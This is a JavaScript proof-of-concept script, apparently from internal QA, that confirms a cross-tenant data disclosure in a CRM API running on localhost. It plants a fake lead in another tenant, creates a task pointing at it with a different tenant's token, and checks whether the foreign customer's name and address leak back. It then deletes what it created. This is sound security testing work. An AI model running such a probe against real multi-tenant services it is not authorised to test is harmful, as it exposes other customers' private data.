// Run 125-s1 — PROVES the cross-tenant disclosure via POST /api/crm/tasks.
// Creates ONE temporary lead in a DIFFERENT tenant, attaches a waterloo task to it via
// the API, and reads it back through the two consumer endpoints. Everything deleted.
import fs from 'fs';
import pool from './src/db/pool.js';
const BASE='http://localhost:3001';
const T=fs.readFileSync('C:/tmp/qa-token.txt','utf8').trim();
const H={'Content-Type':'application/json',Authorization:`Bearer ${T}`};
const req=async(m,p,b)=>{const r=await fetch(BASE+p,{method:m,headers:H,body:b===undefined?undefined:JSON.stringify(b)});
  const t=await r.text();let j=null;try{j=JSON.parse(t);}catch{}return{st:r.status,j,t:t.slice(0,150)};};
const q=async(s,p)=>(await pool.query(s,p)).rows;
const W=(await q(`SELECT id FROM tenants WHERE slug='waterloo'`))[0].id;
const OTHER=(await q(`SELECT id,slug FROM tenants WHERE slug='stormleads-test'`))[0];
const fUser=(await q(`SELECT id,first_name,last_name,tenant_id FROM users WHERE tenant_id IS NOT NULL AND tenant_id<>$1 LIMIT 1`,[W]))[0];
const t0=(await q(`SELECT count(*)::int c FROM tasks`))[0].c;
const l0=(await q(`SELECT count(*)::int c FROM leads`))[0].c;

// --- fixture: one lead owned by the OTHER tenant, with recognisable PII
const FL=(await q(
  `INSERT INTO leads (tenant_id, contact_name, address, city)
   VALUES ($1,'ZZ-VICTIM-CUSTOMER','999 SECRET STREET','Nowhere') RETURNING id`,[OTHER.id]))[0].id;
console.log(`fixture lead ${FL} in tenant ${OTHER.slug}`);
console.log(`foreign user ${fUser.id} = ${fUser.first_name} ${fUser.last_name} (tenant ${fUser.tenant_id})`);

// --- attack: waterloo token creates a task pointing at BOTH foreign rows
const c=await req('POST','/api/crm/tasks',{title:'QA-R125 leak proof',lead_id:FL,assigned_to:fUser.id,due_date:new Date().toISOString().slice(0,10)});
console.log(`\nPOST /api/crm/tasks (foreign lead_id + foreign assigned_to) -> ${c.st}`);
const tid=c.j?.id;
console.log(`created task tenant_id=${c.j?.tenant_id} (waterloo=${W})`);

// --- read back through the two consumer endpoints
const list=await req('GET','/api/crm/tasks');
const row=(list.j?.tasks||[]).find(x=>x.id===tid)||{};
console.log(`\nGET /api/crm/tasks -> ${list.st}`);
console.log(`   assignee_first_name=${JSON.stringify(row.assignee_first_name)} assignee_last_name=${JSON.stringify(row.assignee_last_name)}`);
const leaked1 = row.assignee_first_name===fUser.first_name;
console.log(leaked1?`   *** LEAK: another tenant's USER NAME disclosed`:'   ok: no assignee name returned');

const td=await req('GET','/api/crm/dashboard/tasks-today');
const arr=Array.isArray(td.j)?td.j:(td.j?.tasks||[]);
const r2=arr.find(x=>x.id===tid)||{};
console.log(`\nGET /api/crm/dashboard/tasks-today -> ${td.st}`);
console.log(`   lead_name=${JSON.stringify(r2.lead_name)} lead_address=${JSON.stringify(r2.lead_address)}`);
const leaked2 = r2.lead_name==='ZZ-VICTIM-CUSTOMER'||r2.lead_address==='999 SECRET STREET';
console.log(leaked2?`   *** LEAK: another tenant's CUSTOMER NAME + STREET ADDRESS disclosed`:'   ok: no foreign lead data returned');

// --- cleanup
if(tid)await pool.query(`DELETE FROM tasks WHERE id=$1`,[tid]);
await pool.query(`DELETE FROM leads WHERE id=$1`,[FL]);
const t1=(await q(`SELECT count(*)::int c FROM tasks`))[0].c;
const l1=(await q(`SELECT count(*)::int c FROM leads`))[0].c;
console.log(`\nnet-zero: tasks ${t0}->${t1}  leads ${l0}->${l1}`);
console.log(`VERDICT: ${(leaked1||leaked2)?'CONFIRMED CROSS-TENANT DISCLOSURE':'no leak'}`);
await pool.end();
